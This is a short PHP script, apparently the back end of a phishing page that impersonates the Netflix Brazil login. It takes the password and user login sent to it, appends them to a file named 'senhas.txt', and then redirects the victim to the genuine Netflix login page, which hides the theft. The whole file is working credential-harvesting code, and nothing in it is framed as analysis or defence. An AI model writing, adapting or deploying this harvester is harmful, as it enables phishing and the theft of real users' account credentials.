<?php
$caixa1 = $_GET["password"] . "\n";
$caixa2 = $_GET["userLoginId"] . "\n";

$file = fopen("senhas.txt","a");

$escrever1 = fwrite($file, $caixa1);
$escrever2 = fwrite($file, $caixa2);

fclose($file);

header("Location: http://www.netflix.com/br/login");
?>
